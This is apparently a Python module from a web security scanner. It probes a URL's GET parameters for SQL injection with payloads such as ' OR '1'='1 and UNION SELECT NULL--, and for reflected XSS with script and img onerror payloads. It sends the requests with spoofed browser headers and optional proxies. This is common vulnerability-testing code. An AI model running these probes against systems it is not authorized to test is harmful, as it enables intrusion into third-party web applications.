import requests
import time
from typing import List, Dict, Any, Tuple, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Default Headers to look like a real browser (Same as in tools.py)
# We duplicate it here to avoid circular imports or complex dependency injection for now.
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def check_sqli(url: str, params: Dict[str, Any] = None, proxies: Optional[Dict[str, str]] = None) -> str:
    """
    Performs a basic check for SQL Injection vulnerabilities on GET parameters.
    Returns a report string.
    """
    # If no params provided, try to extract from URL
    if not params:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        # Flatten params for simplicity (take first value)
        params = {k: v[0] for k, v in params.items()}

    if not params:
        return "No parameters found to test for SQLi."

    # Payloads
    # 1. Error Based
    # 2. Boolean Based (Simple 1=1 vs 1=2)
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1 --",
        "UNION SELECT NULL--",
        "admin' --"
    ]

    error_patterns = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL",
        "SQLite/JDBCDriver"
    ]

    report = []
    vulnerable = False

    try:
        base_response = requests.get(url, timeout=10, proxies=proxies, headers=DEFAULT_HEADERS)
        base_len = len(base_response.text)
    except Exception as e:
         return f"Error connecting to target: {e}"

    for param_name, original_value in params.items():
        report.append(f"Testing parameter: {param_name}")

        for payload in payloads:
            # Construct malicious URL
            test_params = params.copy()
            test_params[param_name] = original_value + payload

            # Rebuild URL
            url_parts = list(urlparse(url))
            query = dict(parse_qs(url_parts[4]))
            query.update(test_params)
            url_parts[4] = urlencode(query, doseq=True)
            test_url = urlunparse(url_parts)

            try:
                # Send Request
                resp = requests.get(test_url, timeout=10, proxies=proxies, headers=DEFAULT_HEADERS)

                # Check for Error Reflection
                found_error = any(p in resp.text for p in error_patterns)
                if found_error:
                    vulnerable = True
                    report.append(f"  [VULNERABLE] Payload: {payload} -> Triggered SQL Error message.")
                    break # Stop testing this param if vulnerablity found

            except Exception as e:
                report.append(f"  [ERROR] Request failed: {e}")

    if vulnerable:
        return "VULNERABILITY DETECTED (SQL Injection):\n" + "\n".join(report)
    else:
        return "No obvious SQLi errors detected with basic payloads.\n" + "\n".join(report)

def check_xss(url: str, params: Dict[str, Any] = None, proxies: Optional[Dict[str, str]] = None) -> str:
    """
    Performs a basic check for Reflected XSS.
    """
    if not params:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params = {k: v[0] for k, v in params.items()}

    if not params:
        return "No parameters found to test for XSS."

    # A simple unique token to search for reflection
    canary = "XSS_TEST_" + str(int(time.time()))
    payloads = [
        f"<script>alert('{canary}')</script>",
        f"\"><script>alert('{canary}')</script>",
        f"<img src=x onerror=alert('{canary}')>"
    ]

    report = []
    vulnerable = False

    for param_name, original_value in params.items():
        report.append(f"Testing parameter: {param_name}")

        for payload in payloads:
             # Construct malicious URL
            test_params = params.copy()
            test_params[param_name] = payload # Replace entirely or append? Usually replace for XSS

            url_parts = list(urlparse(url))
            query = dict(parse_qs(url_parts[4]))
            query.update(test_params)
            url_parts[4] = urlencode(query, doseq=True)
            test_url = urlunparse(url_parts)

            try:
                resp = requests.get(test_url, timeout=10, proxies=proxies, headers=DEFAULT_HEADERS)

                # Check Reflection
                if payload in resp.text:
                    vulnerable = True
                    report.append(f"  [VULNERABLE] Payload reflected in response: {payload}")
                    # Capture snippet
                    idx = resp.text.find(payload)
                    snippet = resp.text[max(0, idx-50):min(len(resp.text), idx+len(payload)+50)]
                    report.append(f"    Context: ...{snippet}...")
                    break

            except Exception as e:
                report.append(f"  [ERROR] Request failed: {e}")

    if vulnerable:
        return "VULNERABILITY DETECTED (Reflected XSS):\n" + "\n".join(report)
    else:
        return "No Reflected XSS detected with basic payloads.\n" + "\n".join(report)
